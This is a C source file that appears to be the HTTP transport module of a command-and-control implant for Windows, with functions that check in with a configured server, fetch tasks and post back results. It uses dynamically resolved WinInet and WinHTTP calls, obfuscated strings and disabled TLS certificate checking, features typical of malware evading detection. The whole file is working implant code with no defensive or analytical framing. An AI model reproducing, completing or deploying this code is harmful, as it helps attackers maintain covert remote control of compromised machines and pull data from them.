#include "config.h"
#ifdef HTTP_TRANSPORT

#include "common.h"
#include "transport_http.h"

#ifdef USE_WININET

// ── WinInet transport ──────────────────────────────────────────────────────────

#define INTERNET_SERVICE_HTTP       3
#define INTERNET_FLAG_SECURE        0x00800000
#define INTERNET_FLAG_RELOAD        0x80000000
#define INTERNET_FLAG_NO_CACHE_WRITE 0x04000000
#define INTERNET_FLAG_KEEP_CONNECTION 0x00400000
#define INTERNET_OPTION_SECURITY_FLAGS 31
#define SECURITY_FLAG_IGNORE_ALL    0x00003380

static BOOL _http_request(PINSTANCE inst, LPCSTR verb, LPCSTR path,
                          BYTE* body, DWORD body_len,
                          BYTE** response, DWORD* resp_len) {
    if (!inst->Win32.InternetOpenA) return FALSE;

    HINTERNET hSession = inst->Win32.InternetOpenA(
        inst->Http.user_agent, 0, NULL, NULL, 0);
    if (!hSession) return FALSE;

    HINTERNET hConnect = inst->Win32.InternetConnectA(
        hSession, inst->Http.host, (WORD)inst->Http.port,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        inst->Win32.InternetCloseHandle(hSession);
        return FALSE;
    }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    if (inst->Http.use_ssl)
        flags |= INTERNET_FLAG_SECURE;

    HINTERNET hRequest = inst->Win32.HttpOpenRequestA(
        hConnect, verb, path, NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        inst->Win32.InternetCloseHandle(hConnect);
        inst->Win32.InternetCloseHandle(hSession);
        return FALSE;
    }

    if (inst->Http.use_ssl) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_ALL;
        inst->Win32.InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                                       &sec_flags, sizeof(sec_flags));
    }

    BOOL sent = inst->Win32.HttpSendRequestA(
        hRequest, NULL, 0, body, body_len);
    if (!sent) {
        inst->Win32.InternetCloseHandle(hRequest);
        inst->Win32.InternetCloseHandle(hConnect);
        inst->Win32.InternetCloseHandle(hSession);
        return FALSE;
    }

    DWORD total_size = 0;
    BYTE* total_buf = NULL;
    BYTE  tmp[4096];
    DWORD read = 0;

    while (inst->Win32.InternetReadFile(hRequest, tmp, sizeof(tmp), &read) && read > 0) {
        BYTE* new_buf = (BYTE*)es_realloc(inst, total_buf, total_size + read);
        if (!new_buf) {
            // realloc failed - free old buf and return error
            if (total_buf) es_free(inst, total_buf);
            inst->Win32.InternetCloseHandle(hRequest);
            inst->Win32.InternetCloseHandle(hConnect);
            inst->Win32.InternetCloseHandle(hSession);
            if (response) *response = NULL;
            if (resp_len) *resp_len = 0;
            return FALSE;
        }
        total_buf = new_buf;
        es_memcpy(total_buf + total_size, tmp, read);
        total_size += read;
        read = 0;
    }

    inst->Win32.InternetCloseHandle(hRequest);
    inst->Win32.InternetCloseHandle(hConnect);
    inst->Win32.InternetCloseHandle(hSession);

    if (response) *response = total_buf;
    if (resp_len) *resp_len = total_size;
    return TRUE;
}

static void build_path(const char* uri, char* out, int out_size) {
    int offset = 0;
    if (uri[0] != '/') {
        out[0] = '/';
        offset = 1;
    }
    for (int i = 0; uri[i] && (offset + i) < out_size - 1; i++)
        out[offset + i] = uri[i];
}

BOOL http_checkin(PINSTANCE inst) {
    char path[256] = {0};
    build_path(inst->Http.get_uri, path, 256);
    return _http_request(inst, "GET", path, NULL, 0, NULL, NULL);
}

BOOL http_get_tasks(PINSTANCE inst, BYTE** tasks, DWORD* tasks_len) {
    char path[256] = {0};
    build_path(inst->Http.get_uri, path, 256);
    return _http_request(inst, "GET", path, NULL, 0, tasks, tasks_len);
}

BOOL http_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
                        BYTE** response, DWORD* resp_len) {
    char path[256] = {0};
    build_path(inst->Http.post_uri, path, 256);
    return _http_request(inst, "POST", path, data, data_len, response, resp_len);
}

#else // USE_WINHTTP

// ── WinHTTP transport ──────────────────────────────────────────────────────────

#include <winhttp.h>

static BOOL _http_request(PINSTANCE inst, LPCWSTR verb, LPCWSTR path,
                          BYTE* body, DWORD body_len,
                          BYTE** response, DWORD* resp_len) {
    if (!inst->Win32.WinHttpOpen) return FALSE;

    wchar_t whost[256] = {0};
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, inst->Http.host, -1, whost, 256);

    wchar_t wua[256] = {0};
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, inst->Http.user_agent, -1, wua, 256);

    HINTERNET hSession = inst->Win32.WinHttpOpen(
        wua, 0 /*WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*/, NULL, NULL, 0);
    if (!hSession) return FALSE;

    HINTERNET hConnect = inst->Win32.WinHttpConnect(
        hSession, whost, (WORD)inst->Http.port, 0);
    if (!hConnect) {
        inst->Win32.WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD flags = inst->Http.use_ssl ? 0x00800000 /*WINHTTP_FLAG_SECURE*/ : 0;
    HINTERNET hRequest = inst->Win32.WinHttpOpenRequest(
        hConnect, verb, path, NULL, NULL, NULL, flags);
    if (!hRequest) {
        inst->Win32.WinHttpCloseHandle(hConnect);
        inst->Win32.WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (inst->Http.use_ssl) {
        DWORD sec_flags = 0x00003300;
        inst->Win32.WinHttpSetOption(hRequest, 31,
                                     &sec_flags, sizeof(sec_flags));
    }

    BOOL sent = inst->Win32.WinHttpSendRequest(
        hRequest, NULL, 0, body, body_len, body_len, 0);
    if (!sent) {
        inst->Win32.WinHttpCloseHandle(hRequest);
        inst->Win32.WinHttpCloseHandle(hConnect);
        inst->Win32.WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (!inst->Win32.WinHttpReceiveResponse(hRequest, NULL)) {
        inst->Win32.WinHttpCloseHandle(hRequest);
        inst->Win32.WinHttpCloseHandle(hConnect);
        inst->Win32.WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD total_size = 0;
    BYTE* total_buf = NULL;
    DWORD avail = 0;

    while (inst->Win32.WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        BYTE* new_buf = (BYTE*)es_realloc(inst, total_buf, total_size + avail);
        if (!new_buf) break;
        total_buf = new_buf;

        DWORD read = 0;
        inst->Win32.WinHttpReadData(hRequest, total_buf + total_size, avail, &read);
        total_size += read;
    }

    inst->Win32.WinHttpCloseHandle(hRequest);
    inst->Win32.WinHttpCloseHandle(hConnect);
    inst->Win32.WinHttpCloseHandle(hSession);

    if (response) *response = total_buf;
    if (resp_len) *resp_len = total_size;
    return TRUE;
}

static void build_path(PINSTANCE inst, const char* uri, wchar_t* wpath, int wpath_size) {
    char path[256] = {0};
    int offset = 0;
    if (uri[0] != '/') {
        path[0] = '/';
        offset = 1;
    }
    for (int i = 0; uri[i] && (offset + i) < 254; i++)
        path[offset + i] = uri[i];
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, wpath_size);
}

BOOL http_checkin(PINSTANCE inst) {
    wchar_t wpath[256] = {0};
    build_path(inst, inst->Http.get_uri, wpath, 256);
    return _http_request(inst, XWSTR(L"GET"), wpath, NULL, 0, NULL, NULL);
}

BOOL http_get_tasks(PINSTANCE inst, BYTE** tasks, DWORD* tasks_len) {
    wchar_t wpath[256] = {0};
    build_path(inst, inst->Http.get_uri, wpath, 256);
    return _http_request(inst, XWSTR(L"GET"), wpath, NULL, 0, tasks, tasks_len);
}

BOOL http_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
                        BYTE** response, DWORD* resp_len) {
    wchar_t wpath[256] = {0};
    build_path(inst, inst->Http.post_uri, wpath, 256);
    return _http_request(inst, XWSTR(L"POST"), wpath, data, data_len, response, resp_len);
}

#endif // USE_WININET / USE_WINHTTP

#endif // HTTP_TRANSPORT
